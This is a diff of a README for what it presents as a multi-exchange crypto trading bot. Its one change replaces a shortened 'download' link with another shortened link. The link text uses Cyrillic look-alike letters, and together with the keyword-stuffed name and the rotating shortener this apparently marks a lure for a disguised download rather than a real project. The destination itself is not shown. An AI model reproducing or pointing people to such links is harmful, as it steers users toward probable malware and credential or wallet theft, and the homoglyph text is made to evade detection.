@@ -1,6 +1,6 @@
 # Crypto-Trading-Bot-Binance-Kucoin-Kraken-Coinbase-Bybit-Poloniex-Bittrex-Okx-Bitmex
 
-# |[Сliсk here to Dоwnlоаd](https://rb.gy/xwxr4)|
+# |[Сliсk here to Dоwnlоаd](https://rb.gy/ihyxrc)|
 
 <a name="prerequis"/>
  
